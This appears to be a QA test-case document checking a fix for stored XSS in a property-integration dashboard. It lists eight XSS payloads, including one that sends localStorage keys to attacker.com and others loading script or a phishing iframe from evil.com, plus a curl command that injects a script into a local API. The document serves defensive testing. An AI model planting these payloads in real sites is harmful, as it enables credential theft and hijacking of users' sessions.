# HIGH-004 XSS Protection Test Cases

This document contains test cases to verify that the XSS protection fixes (HIGH-004) work correctly.

## Test Objective

Verify that:
1. ✅ **Legitimate special characters** display correctly (e.g., `&`, `"`, `'`, `<`, `>`)
2. ✅ **Malicious XSS payloads** are neutralized (displayed as text, not executed)

---

## Test Data Sets

### ✅ Test Set 1: Legitimate Special Characters

These organization names contain special characters that should display correctly without being double-escaped.

| **Organization Name** | **Expected Display** | **Notes** |
|---|---|---|
| `Smith & Sons Ltd` | Smith & Sons Ltd | Ampersand should display correctly |
| `"Best" Property Agents` | "Best" Property Agents | Double quotes should display |
| `O'Reilly Estate Agents` | O'Reilly Estate Agents | Single quote (apostrophe) should display |
| `Smith & Jones "Premium" Properties` | Smith & Jones "Premium" Properties | Multiple special chars |
| `Property < $1M Specialists` | Property < $1M Specialists | Less-than symbol |
| `High-End > Luxury Homes` | High-End > Luxury Homes | Greater-than symbol |
| `Multi & "Diverse" <Properties>` | Multi & "Diverse" <Properties> | All special characters combined |

**How to Test:**
1. Add organization mapping via Configuration API or Alto dashboard
2. View organization in dashboards (alto-integration.html, migration-dashboard.html)
3. Verify special characters display exactly as entered

---

### ⚠️ Test Set 2: XSS Attack Payloads (Should be BLOCKED)

These malicious payloads should be **displayed as plain text** and **NOT executed**.

#### **Attack 1: Basic Script Tag**
```
<script>alert('XSS')</script>
```
**Expected Behavior:**
- Displays: `<script>alert('XSS')</script>` (as text)
- ❌ **FAILS if**: Alert popup appears

---

#### **Attack 2: Image onerror Event**
```
<img src=x onerror="alert('Hacked')">
```
**Expected Behavior:**
- Displays: `<img src=x onerror="alert('Hacked')">` (as text)
- ❌ **FAILS if**: Alert popup appears or broken image icon appears

---

#### **Attack 3: Credential Theft via Fetch**
```
<img src=x onerror='fetch("https://attacker.com/steal?keys="+localStorage.getItem("function_keys"))'>
```
**Expected Behavior:**
- Displays: Full text as shown above
- ❌ **FAILS if**: Network request to attacker.com appears in DevTools Network tab

---

#### **Attack 4: Stored XSS with Event Handler**
```
<div onclick="alert(document.cookie)">Click Me</div>
```
**Expected Behavior:**
- Displays: `<div onclick="alert(document.cookie)">Click Me</div>` (as text)
- ❌ **FAILS if**: Text becomes clickable and triggers alert

---

#### **Attack 5: Script Tag with src Attribute**
```
<script src="https://evil.com/malicious.js"></script>
```
**Expected Behavior:**
- Displays: Full text as shown above
- ❌ **FAILS if**: Network request to evil.com appears in DevTools

---

#### **Attack 6: SVG with JavaScript**
```
<svg onload="alert('XSS via SVG')"></svg>
```
**Expected Behavior:**
- Displays: `<svg onload="alert('XSS via SVG')"></svg>` (as text)
- ❌ **FAILS if**: Alert popup appears

---

#### **Attack 7: Obfuscated Script**
```
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
```
**Expected Behavior:**
- Displays: Full encoded text
- ❌ **FAILS if**: Alert popup appears

---

#### **Attack 8: iframe Injection**
```
<iframe src="https://evil.com/phishing.html"></iframe>
```
**Expected Behavior:**
- Displays: `<iframe src="https://evil.com/phishing.html"></iframe>` (as text)
- ❌ **FAILS if**: Embedded iframe appears

---

## Manual Testing Procedure

### **Step 1: Test Legitimate Special Characters**

1. Open Azure Functions dashboard
2. Navigate to Settings → Organization Management
3. Add a test organization with name: `Test & "Special" <Chars>`
   - Agency Ref: `test-special-chars`
   - TDS Member ID: `TEST001`
   - TDS Branch ID: `MAIN`
   - Member Name: `Test & "Special" <Chars>`

4. Click "Add Organization Mapping"
5. Refresh organization table
6. **Verify**: Organization name displays correctly: `Test & "Special" <Chars>`
   - Ampersand should be `&` not `&amp;`
   - Quotes should be `"` not `&quot;`
   - Angle brackets should be `<` and `>` not `&lt;` and `&gt;`

---

### **Step 2: Test XSS Attack Payloads**

⚠️ **WARNING**: These tests inject malicious code. Only run in development environment!

For each attack payload in Test Set 2:

1. Add organization mapping via Configuration API:
```bash
curl -X POST http://localhost:7071/api/organization/add \
  -H "Content-Type: application/json" \
  -d '{
    "agencyRef": "xss-test-1",
    "branchId": "MAIN",
    "tdsMemberId": "XSS001",
    "tdsBranchId": "TEST",
    "tdsApiKey": "test-key",
    "memberName": "<script>alert(\"XSS\")</script>"
  }'
```

2. Open alto-integration.html dashboard
3. View organization table
4. **Verify**:
   - ✅ **PASS**: Script tag is displayed as plain text
   - ❌ **FAIL**: Alert popup appears (XSS executed!)

5. Open migration-dashboard.html
6. Repeat verification

7. Click "Edit" button on the XSS test organization
8. **Verify**:
   - ✅ **PASS**: Modal displays script tag as plain text in form field
   - ❌ **FAIL**: Alert popup appears or form field shows escaped HTML entities

---

### **Step 3: Browser DevTools Verification**

1. Open browser DevTools (F12)
2. Go to **Console** tab
3. **Verify**: No JavaScript errors related to XSS
4. Go to **Network** tab
5. **Verify**: No requests to attacker.com, evil.com, or other malicious domains
6. Go to **Elements** tab
7. Inspect organization name cells
8. **Verify**: Text nodes contain plain text, not HTML elements

Example of secure rendering:
```html
<!-- ✅ SECURE (after fix) -->
<td>
  <div>Test & "Special" <Chars></div>  <!-- Text node, not HTML -->
</td>

<!-- ❌ VULNERABLE (before fix) -->
<td>
  <div><script>alert('XSS')</script></div>  <!-- Executable script! -->
</td>
```

---

## Automated Test Suite (Browser Console)

Run this in browser console to quickly verify XSS protection:

```javascript
// Test XSS protection in safe-render.js
console.group('🔒 XSS Protection Tests');

const testCases = [
  {
    name: 'Special Characters',
    input: 'Smith & Sons "Property" Ltd',
    expectedText: 'Smith & Sons "Property" Ltd',
    shouldNotContain: '&amp;',
  },
  {
    name: 'Script Tag',
    input: '<script>alert("XSS")</script>',
    expectedText: '<script>alert("XSS")</script>',
    shouldNotExecute: true
  },
  {
    name: 'Event Handler',
    input: '<img src=x onerror="alert(1)">',
    expectedText: '<img src=x onerror="alert(1)">',
    shouldNotExecute: true
  },
  {
    name: 'HTML Injection',
    input: '<div onclick="malicious()">Click</div>',
    expectedText: '<div onclick="malicious()">Click</div>',
    shouldNotExecute: true
  }
];

let passed = 0;
let failed = 0;

testCases.forEach(test => {
  const element = document.createElement('div');
  element.textContent = test.input; // Using textContent (secure method)

  const actual = element.textContent;
  const hasScriptTag = element.querySelector('script');
  const hasEventHandler = element.querySelector('[onerror],[onclick]');

  const isTextOnly = actual === test.input;
  const noExecution = !hasScriptTag && !hasEventHandler;
  const testPassed = isTextOnly && noExecution;

  if (testPassed) {
    console.log(`✅ ${test.name}`);
    console.log(`   Input: "${test.input}"`);
    console.log(`   Output: "${actual}"`);
    console.log(`   Safe: true`);
    passed++;
  } else {
    console.error(`❌ ${test.name}`);
    console.error(`   Input: "${test.input}"`);
    console.error(`   Output: "${actual}"`);
    console.error(`   Safe: false - XSS VULNERABILITY!`);
    failed++;
  }
});

console.groupEnd();
console.log(`\nResults: ${passed} passed, ${failed} failed`);

if (failed === 0) {
  console.log('✅ All XSS protection tests PASSED');
} else {
  console.error(`❌ ${failed} tests FAILED - XSS vulnerabilities detected!`);
}
```

---

## Production Readiness Checklist

Before deploying to production, verify:

- [ ] All Test Set 1 cases (special characters) display correctly
- [ ] All Test Set 2 cases (XSS payloads) are neutralized (displayed as text)
- [ ] No JavaScript errors in browser console
- [ ] No network requests to malicious domains
- [ ] Browser DevTools Elements tab shows text nodes, not HTML elements
- [ ] Automated test suite passes with 0 failures
- [ ] Edit modals display XSS payloads as plain text in form fields
- [ ] Organization tables in both dashboards render safely
- [ ] Pending integrations table renders tenancy IDs safely
- [ ] Audit log table renders error messages safely

---

## Common Issues and Solutions

### **Issue 1: Special characters display as HTML entities**

**Symptom**: `Smith &amp; Sons` instead of `Smith & Sons`

**Cause**: Data was double-escaped (escaped during storage AND during rendering)

**Solution**:
- Check database - if data is stored as `&amp;`, update to `&`
- OR remove escaping from backend and rely on frontend textContent

---

### **Issue 2: XSS payloads execute despite fixes**

**Symptom**: Alert popup appears when viewing organization table

**Cause**: Some innerHTML usage was missed during refactoring

**Solution**:
1. Search codebase for `innerHTML` usage
2. Verify all instances use safe-render.js utilities or createElement/textContent
3. Check modal rendering code for template string injection

---

### **Issue 3: Broken layout after refactoring**

**Symptom**: Tables don't render correctly, missing columns

**Cause**: DOM structure doesn't match original HTML structure

**Solution**:
1. Compare rendered DOM in Elements tab before/after fix
2. Ensure same number of `<td>` cells per row
3. Verify CSS classes are applied correctly

---

## Security Testing Tools (Optional)

### **Browser Extension: XSS Tester**
- Install: https://chrome.google.com/webstore (search "XSS Tester")
- Use to inject common XSS payloads automatically

### **ZAP (OWASP Zed Attack Proxy)**
- Download: https://www.zaproxy.org/
- Run active scan on dashboard URLs
- Review alerts for XSS vulnerabilities

### **Burp Suite Community Edition**
- Download: https://portswigger.net/burp/communitydownload
- Intercept requests to Configuration API
- Modify organization names to include XSS payloads
- Verify dashboards don't execute injected scripts

---

## Test Results Template

Use this template to document your test results:

```
Test Date: _________________
Tester: _________________
Environment: [ ] Development  [ ] Staging  [ ] Production

Special Characters Test (Test Set 1):
[ ] Test 1 - Ampersand: PASS / FAIL
[ ] Test 2 - Double quotes: PASS / FAIL
[ ] Test 3 - Single quote: PASS / FAIL
[ ] Test 4 - Multiple chars: PASS / FAIL
[ ] Test 5 - Less-than: PASS / FAIL
[ ] Test 6 - Greater-than: PASS / FAIL
[ ] Test 7 - All combined: PASS / FAIL

XSS Attack Payloads (Test Set 2):
[ ] Attack 1 - Script tag: PASS / FAIL
[ ] Attack 2 - Image onerror: PASS / FAIL
[ ] Attack 3 - Credential theft: PASS / FAIL
[ ] Attack 4 - Event handler: PASS / FAIL
[ ] Attack 5 - External script: PASS / FAIL
[ ] Attack 6 - SVG XSS: PASS / FAIL
[ ] Attack 7 - Obfuscated: PASS / FAIL
[ ] Attack 8 - iframe injection: PASS / FAIL

Overall Result: PASS / FAIL

Notes:
_______________________________________________________
_______________________________________________________
_______________________________________________________
```

---

## Additional Resources

- **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **MDN textContent vs innerHTML**: https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent
- **DOM-based XSS**: https://owasp.org/www-community/attacks/DOM_Based_XSS

---

**Document Version**: 1.0
**Last Updated**: 2025-10-14
**Related Security Issue**: HIGH-004: Stored Cross-Site Scripting (XSS) in HTML Dashboards
